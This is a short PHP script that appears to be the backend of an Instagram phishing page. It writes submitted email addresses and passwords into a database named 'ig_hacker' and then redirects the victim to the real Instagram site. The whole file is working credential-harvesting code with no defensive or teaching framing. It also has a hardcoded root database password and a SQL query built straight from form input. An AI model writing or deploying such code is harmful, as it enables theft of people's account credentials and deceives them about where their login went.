<?php

$servername = "localhost";
$db_username = "root";
$db_password = "hello";
$database = "ig_hacker";

$conn = new mysqli(
    $servername,
     $db_username,
       $db_password,
        $database
        );

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$email= $_POST['email'];
$password= $_POST['password'];

$sql = "insert into users (email, password)
        values ('$email', '$password')";

if ($conn->query($sql) === TRUE) {
    header("Location: https://www.instagram.com/ ");
    exit();
} 
    else {
    echo "Error: " . $conn->error;
}
?>